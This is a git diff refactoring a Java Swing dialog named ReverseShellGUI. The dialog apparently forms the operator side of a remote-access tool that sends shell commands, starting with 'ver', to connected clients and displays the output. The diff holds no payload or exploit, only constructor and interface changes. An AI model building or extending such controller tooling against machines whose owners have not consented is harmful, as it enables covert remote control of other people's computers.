@@ -1,7 +1,10 @@
 package GUI.TableUtils.ReverseShell;
 
+import Connections.Client;
 import Connections.ClientHandler;
 import Connections.Streams;
+import GUI.Main;
+import Information.GUIManagerInterface;
 
 import javax.swing.*;
 
@@ -14,17 +17,18 @@ import java.awt.*;
  */
 
 
-public class ReverseShellGUI {
-    private final Streams stream;
+public class ReverseShellGUI implements GUIManagerInterface {
     private final JDialog reverseShellDialog;
     private JTextField fieldOfCommands;
     private JTextArea textAreaOfResult;
     private boolean pressedEnter = false;
     private String lastPath;
 
-    public ReverseShellGUI(Streams stream, ClientHandler clientHandler,JFrame mainGUI) {
-        this.stream = stream;
-        reverseShellDialog = new JDialog(mainGUI, "Reverse shell -" + clientHandler.getIdentifier());
+    private final Client client;
+
+    public ReverseShellGUI(Client client) {
+        this.client = client;
+        reverseShellDialog = new JDialog(Main.gui.getMainGUI(), "Reverse shell -" + client.getIdentifier());
         reverseShellDialog.setSize(new Dimension(500, 300));
         reverseShellDialog.setLocationRelativeTo(null);
         reverseShellDialog.setLayout(new GridBagLayout());
@@ -95,11 +99,7 @@ public class ReverseShellGUI {
     }
 
     private void getCurrentPathAtStart() {
-        stream.getExecutor().submit(new CommandSender(this, "ver"));
-    }
-
-    public Streams getStream() {
-        return stream;
+        client.getExecutor().submit(new CommandSender(this, "ver"));
     }
 
     public JTextField getFieldOfCommands() {
@@ -108,5 +108,9 @@ public class ReverseShellGUI {
 
     public JTextArea getTextAreaOfResult() {
         return textAreaOfResult;
+    }
+
+    public Client getClient() {
+        return client;
     }
 }
